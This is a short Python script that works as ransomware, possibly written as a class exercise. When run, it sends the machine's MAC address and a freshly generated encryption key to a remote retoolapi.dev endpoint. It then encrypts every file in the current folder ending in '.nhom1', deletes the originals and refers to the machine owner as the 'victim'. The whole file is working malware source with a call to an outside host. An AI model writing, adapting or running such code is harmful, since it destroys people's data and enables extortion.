import os 
import requests
import uuid
import json
from cryptography.fernet import Fernet

def check_key_mac(mac_add):
  headers = {"Accept": "application/json"}
  url = 'https://retoolapi.dev/nYHSqM/data?mac=' + mac_add
  respone = requests.get(url=url, headers=headers)
  json_respone = json.loads(respone.text)
  try:
    mac_victim = json_respone[0]['key']
  except:
    mac_victim = 'NA'
  return mac_victim

def starting_enc():
  mac_address = uuid.getnode()
  # Convert the MAC address to a string with colons
  mac_address_str = ':'.join(("%012x" % mac_address)[i:i+2] for i in range(0, 12, 2))
  key_vitim = check_key_mac(mac_address_str)
  
  if key_vitim != 'NA':
    key = key_vitim
    fernet = Fernet(key=key)
    encrypting(fernet)
  else:
    key = Fernet.generate_key()
    fernet = Fernet(key=key)
    data = {"mac": mac_address_str, "key": key}
    headers = {"Accept": "application/json"}
    url = 'https://retoolapi.dev/nYHSqM/data'
    requests.post(url=url, headers=headers, data=data)
    encrypting(fernet)

def encrypting(fernet):
  for f in os.listdir():
    if f.endswith('.nhom1'):
      encypt_file(f, fernet)

def encypt_file(lbt_file, fernet):
  with open(lbt_file, 'rb') as f:
    file_data = f.readline()
  encrypted_data = fernet.encrypt(file_data)
  with open(lbt_file + ".enc", "wb") as f:
    f.write(encrypted_data)
  os.remove(lbt_file)

def decrypt_file(enc_file, fernet):
  with open(enc_file, "rb") as f:
    encrypted_data = f.read()
  decrypted_data = fernet.decrypt(encrypted_data)
  print(decrypted_data)

def decrypting(fernet):
  for f in os.listdir():
    if f.endswith('.enc'):
      decrypt_file(f, fernet)

starting_enc()